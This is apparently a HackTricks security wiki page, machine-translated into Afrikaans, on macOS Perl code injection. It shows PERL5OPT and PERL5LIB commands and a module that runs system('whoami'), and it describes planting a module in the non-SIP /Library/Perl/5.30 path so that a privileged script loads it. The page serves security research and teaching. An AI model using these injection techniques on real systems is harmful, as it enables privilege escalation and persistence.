# macOS Perl Toepassings Inspuiting

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Deur `PERL5OPT` & `PERL5LIB` omgewing veranderlike

Deur die omgewing veranderlike PERL5OPT is dit moontlik om perl arbitrêre opdragte uit te voer.\
Byvoorbeeld, skep hierdie skrip:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

Nou **voer die omgewing veranderlike uit** en voer die **perl** skrip uit:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
'n Ander opsie is om 'n Perl-module te skep (bv. `/tmp/pmod.pm`): 

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

En gebruik dan die omgewingsveranderlikes:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Via dependencies

Dit is moontlik om die afhanklikhede gids volgorde van Perl wat loop, te lys:
```bash
perl -e 'print join("\n", @INC)'
```
Wat iets soos die volgende sal teruggee:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Sommige van die teruggekeerdes vouers bestaan selfs nie, egter, **`/Library/Perl/5.30`** **bestaan**, dit is **nie** **beskerm** deur **SIP** nie en dit is **voor** die vouers **beskerm deur SIP**. Daarom kan iemand daardie vouer misbruik om skrip afhanklikhede daarby te voeg sodat 'n hoë bevoegdheid Perl-skrip dit sal laai.

{% hint style="warning" %}
Let egter daarop dat jy **root moet wees om in daardie vouer te skryf** en vandag sal jy hierdie **TCC-prompt** ontvang:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

Byvoorbeeld, as 'n skrip **`use File::Basename;`** invoer, sal dit moontlik wees om `/Library/Perl/5.30/File/Basename.pm` te skep om dit te laat uitvoer willekeurige kode.

## References

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Kyk na die [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) of die [**telegram group**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
